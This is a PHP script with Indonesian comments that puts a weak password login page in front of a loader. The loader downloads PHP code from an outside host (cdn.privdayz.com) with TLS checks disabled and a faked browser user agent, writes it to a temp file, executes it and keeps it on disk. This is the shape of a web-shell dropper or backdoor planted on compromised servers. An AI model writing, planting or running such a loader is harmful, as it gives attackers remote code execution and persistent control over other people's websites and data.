<?php
// Enable error reporting for debugging purposes
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Password protection with hashing
session_start();

// Password hash - ganti dengan hash password yang Anda inginkan
// Untuk membuat hash baru: echo password_hash('password_anda', PASSWORD_DEFAULT);
$password_hash = '$2y$10$P4kTkTU/cCsS1dp77E6eKO/r1xOcHhBuRNcYX9EEmTcALkxLCCiMS'; // Hash untuk "password"

// Check if user is already logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    // Check if password was submitted
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], $password_hash)) {
            $_SESSION['loggedin'] = true;
            $_SESSION['login_time'] = time();
        } else {
            $error = "Password salah!";
        }
    }
    
    // If not logged in, show login form
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>Login Required</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    background-color: #f4f4f4;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .login-container {
                    background-color: white;
                    padding: 30px;
                    border-radius: 8px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    width: 300px;
                    text-align: center;
                }
                .login-container h2 {
                    margin-bottom: 20px;
                    color: #333;
                }
                .login-container input[type="password"] {
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 15px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                    box-sizing: border-box;
                }
                .login-container input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    background-color: #007bff;
                    color: white;
                    border: none;
                    border-radius: 4px;
                    cursor: pointer;
                }
                .login-container input[type="submit"]:hover {
                    background-color: #0056b3;
                }
                .error {
                    color: red;
                    margin-bottom: 15px;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <h2>Login Required</h2>
                <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
                <form method="post">
                    <input type="password" name="password" placeholder="Enter password" required>
                    <input type="submit" value="Login">
                </form>
            </div>
        </body>
        </html>
        <?php
        exit();
    }
}

// Set session timeout (optional - 1 hour)
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > 3600)) {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Function to get URL content
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_get_contents_data = curl_exec($conn);
        if (curl_errno($conn)) {
            echo 'Curl error: ' . curl_error($conn);
            return false;
        }
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
        if ($url_get_contents_data === false) {
            echo 'file_get_contents error';
            return false;
        }
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        if ($handle === false) {
            echo 'fopen error';
            return false;
        }
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Directly execute the main content
$a = geturlsinfo('https://cdn.privdayz.com/txt/marijuana.txt');
if ($a !== false) {
    $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
    file_put_contents($tmp_file, $a);
    include($tmp_file);
    // Do not delete the temporary file
} else {
    echo "Failed to retrieve content.";
}
?>